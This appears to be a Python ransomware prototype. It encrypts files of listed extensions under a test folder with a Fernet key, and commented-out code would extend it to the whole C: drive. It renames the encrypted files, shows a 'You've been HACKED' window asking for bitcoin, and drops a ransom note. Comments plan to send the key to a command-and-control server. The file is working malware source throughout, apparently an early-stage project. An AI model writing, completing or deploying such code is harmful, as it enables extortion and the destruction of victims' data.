import os
import time
from cryptography.fernet import Fernet
from tkinter import *
from tkinter import ttk
from pathlib import Path

#import pathlib
#drive = pathlib.Path.home().drive
#print(drive)
#Goes through all directories and files on C drive
#for root, dirs, files in os.walk(r"C:\\"):


startTime = time.time()
#Uses Fernet symmetric encryption for speed. This should be sent to the C&C server once that is set up so the files can be decrypted after program has been run
key = Fernet.generate_key()
fernet = Fernet(key)
#extensions to be encrypted
#extensions = ["pdf", "txt", "mp3", "jpg", "pptx", "docx"]
extensions = ["pdf"]
with open('key.key', 'wb') as f:
   f.write(key)
   f.close()
fileCounter = 0
#goes through this current directory and encrypts ALL files that have the listed extensions
for root, dirs, files in os.walk(r"./TestDirectories", topdown=False):
    for name in files:
        #separate extension from current file
        ext = name.rsplit('.', 1)
        if (len(ext) > 1):
            ext = ext[1]
            if (ext in extensions):
                curFile = os.path.join(root,name)
                with open(curFile, 'r+b') as f:
                    data = f.read()
                    f.seek(0)
                    extLength = len(ext)
                    paddedExt = ext
                    #sets first 5 char in file to be original file extension with added spaces as buffer
                    for i in range(5-extLength):
                        paddedExt = paddedExt + " "
                    f.write(bytearray(paddedExt, encoding='utf8'))
                    f.write(data)
                    f.seek(0)
                    data = f.read()
                    encrypted = fernet.encrypt(data)
                    f.seek(0)
                    f.write(encrypted)
                    print(curFile)
                    f.close()

                #renaming file to end with "encrypted"
                newName = curFile.rsplit('.', 1)
                newName[0] = newName[0] + ".encrypted" + ext
                os.rename(curFile, newName[0])
                fileCounter = fileCounter + 1

endTime = time.time()
execTime = endTime-startTime
print(f'{fileCounter}, file(s) have been encrypted in, {execTime} seconds')


win = Tk()
win.geometry("750x270")

def open_popup():
   top= Toplevel(win)
   top.geometry("750x250")
   top.title("Bitcoin address")
   Label(top, text= "Please send bitcoin to the address below.", font=('Mistral 18 bold')).place(x=150,y=80)

Label(win, text=" You've been HACKED. Press button below to see message.", font=('Helvetica 14 bold')).pack(pady=20)
#Create a button in the main Window to open the popup
ttk.Button(win, text= "Open", command= open_popup).pack()
win.mainloop()

f = open("ransom.txt", "w+")
f.write("Ransom, Ransom")
f.close()
